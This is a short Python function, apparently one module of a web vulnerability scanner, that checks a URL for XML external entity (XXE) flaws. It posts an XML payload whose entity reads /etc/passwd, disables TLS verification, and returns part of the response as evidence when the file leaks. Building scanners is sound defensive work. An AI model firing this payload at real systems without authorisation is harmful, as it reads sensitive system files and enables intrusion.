def scan(url, proxies=None, session=None, **kw):
    session = session or requests.Session()
    uniq = str(uuid.uuid4())
    payload = f"""<?xml version=\"1.0\"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>
<foo>{uniq}&xxe;</foo>"""
    headers = {"Content-Type": "application/xml"}
    r = session.post(url, data=payload, headers=headers, proxies=proxies, timeout=10, verify=False)
    vulnerable = "root:x:" in r.text
    return {"module": "XXE", "vulnerable": vulnerable, "evidence": r.text[:200] if vulnerable else None}